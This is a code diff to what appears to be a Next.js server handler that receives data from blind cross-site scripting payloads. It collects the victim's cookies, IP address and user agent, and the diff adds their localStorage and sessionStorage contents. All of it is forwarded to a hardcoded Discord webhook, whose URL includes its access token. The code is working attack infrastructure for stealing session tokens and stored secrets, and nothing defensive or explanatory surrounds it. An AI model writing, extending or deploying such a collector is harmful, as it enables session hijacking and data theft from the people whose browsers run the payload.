@@ -6,12 +6,17 @@ export async function getServerSideProps(context) {
   const ip = context.req.headers['x-forwarded-for'] || context.req.socket.remoteAddress || 'Unknown';
   const cookies = context.req.headers.cookie || 'No cookies';
 
+  const localStorageData = data.localStorage || 'No localStorage data';
+  const sessionStorageData = data.sessionStorage || 'No sessionStorage data';
+
   if (Object.keys(data).length > 0) {
     const content = `📢 Blind XSS Triggered!
 Data: ${JSON.stringify(data, null, 2)}
 User-Agent: ${userAgent}
 IP: ${ip}
-Cookies: ${cookies}`;
+Cookies: ${cookies}
+localStorage: ${localStorageData}
+sessionStorage: ${sessionStorageData}`;
 
     try {
       await fetch("https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I", {
